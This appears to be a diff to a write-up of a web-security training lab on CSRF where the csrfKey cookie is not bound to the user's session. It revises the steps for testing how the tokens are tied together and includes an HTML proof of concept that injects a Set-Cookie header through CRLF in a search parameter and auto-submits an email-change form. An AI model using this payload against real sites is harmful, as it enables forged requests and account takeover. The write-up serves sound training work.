@@ -46,9 +46,13 @@ Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoS
 csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
 ```
 
-1. Log in as an attacker and acquire the csrfKey
-2. Log in the victim and set the victim's csrfKey value to the attackers
-3. Deliver the payload
+1. Check if the `csrfKey` is tied to `csrf`
+   - Log in as `wiener:peter` and acquire the user's `csrfKey` and `csrf` values
+   - Capture the request trying to change the user's email. Modify the csrf token so it becomes invalid -> If the application accepts the request, we can conclude the csrfKey and csrf are not tied together. Otherwise, continue to the next step.
+   - Log in as `carlos:montoya` and capture the user's csrf. Replace wiener's csrf token with carlos' -> If the application accepst the request, we can conclud the csrfKey and csrf are not tied together. Otherwise, continue to the next step.
+   - Log in as `wiener:peter` and replace wiener's csrfKey and csrf tokens with carlos'-> If the application accepts the request, we can conclue the csrf and csrfKey are tied together but the pair doesn't tie to the user-session cookie
+3. Log in the victim and set the victim's csrfKey value to the attackers
+4. Deliver the payload
 
 ```bash
 <html>
@@ -59,9 +63,7 @@ csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
       <input type="hidden" name="csrf" value="7UvMSxuvnPngKzO9D1OqyuylaKBAJkpK" />
       <input type="submit" value="Submit request" />
     </form>
-    <script>
       <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
-    </script>
   </body>
 </html>
 ```
